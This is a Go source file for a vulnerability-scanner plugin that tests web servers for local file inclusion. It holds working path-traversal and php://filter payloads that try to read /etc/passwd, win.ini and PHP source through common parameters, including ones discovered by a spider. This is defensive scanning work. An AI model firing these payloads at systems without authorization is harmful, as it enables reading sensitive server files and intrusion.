package plugins

import (
	"DORM/models"
	"fmt"
	"net/url"
	"strings"
)

// 13. LFI (V2.1 - SMART GUESSING)
type LFIPlugin struct{}

func (p *LFIPlugin) Name() string { return "LFI (Local File Inclusion - Smart)" }

func (p *LFIPlugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := models.GetClient()
	baseURL := getURL(target, "")

	endpoints := []string{
		"/", "/index.php", "/main.php", "/home.php", "/view.php",
		"/preview.php", "/loader.php", "/include.php", "/content.php",
	}

	params := []string{"page", "file", "view", "include", "doc", "path", "load", "content", "lang"}

	payloads := []string{
		"/etc/passwd",
		"../../../../../../../../etc/passwd",
		"....//....//....//....//etc/passwd",
		"c:\\windows\\win.ini",
		"php://filter/convert.base64-encode/resource=index.php",
	}

	for _, ep := range endpoints {
		for _, param := range params {
			for _, payload := range payloads {

				targetURL := fmt.Sprintf("%s%s?%s=%s", baseURL, ep, param, payload)

				resp, err := client.Get(targetURL)
				if err == nil {
					defer resp.Body.Close()

					buf := make([]byte, 5120)
					n, _ := resp.Body.Read(buf)
					content := string(buf[:n])

					if strings.Contains(content, "root:x:0:0") ||
						strings.Contains(content, "[fonts]") ||
						strings.Contains(content, "PD9waH") {

						return &models.Vulnerability{
							Target:      target,
							Name:        "Local File Inclusion (LFI)",
							Severity:    "CRITICAL",
							CVSS:        8.5,
							Description: fmt.Sprintf("Critical system file read successfully.\nURL: %s\nPayload: %s", targetURL, payload),
							Solution:    "Restrict file paths using a whitelist or disable dynamic file inclusion.",
							Reference:   "OWASP LFI",
						}
					}
				}
			}
		}
	}

	// === SPIDER ENDPOINT INTEGRATION ===
	key := "endpoints_" + target.IP
	existing, ok := models.SharedData.Load(key)
	if ok {
		spiderEndpoints := existing.([]models.Endpoint)
		for _, ep := range spiderEndpoints {
			if ep.Method == "GET" && len(ep.Params) > 0 {
				for _, param := range ep.Params {
					for _, payload := range payloads {
						// better URL parsing
						parsedUrl, err := url.Parse(ep.URL)
						if err != nil {
							continue
						}
						q := parsedUrl.Query()
						q.Set(param, payload)
						parsedUrl.RawQuery = q.Encode()
						
						targetURL := parsedUrl.String()

						resp, err := client.Get(targetURL)
						if err == nil {
							buf := make([]byte, 5120)
							n, _ := resp.Body.Read(buf)
							content := string(buf[:n])
							resp.Body.Close()

							if strings.Contains(content, "root:x:0:0") ||
								strings.Contains(content, "[fonts]") ||
								strings.Contains(content, "PD9waH") {

								return &models.Vulnerability{
									Target:      target,
									Name:        "Local File Inclusion (Spider-Discovered)",
									Severity:    "CRITICAL",
									CVSS:        8.5,
									Description: fmt.Sprintf("Critical system file read successfully on parameter discovered by Spider.\nURL: %s\nParameter: %s\nPayload: %s", targetURL, param, payload),
									Solution:    "Restrict file paths using a whitelist or disable dynamic file inclusion.",
									Reference:   "OWASP LFI",
								}
							}
						}
					}
				}
			}
		}
	}
	// ===================================
	return nil
}
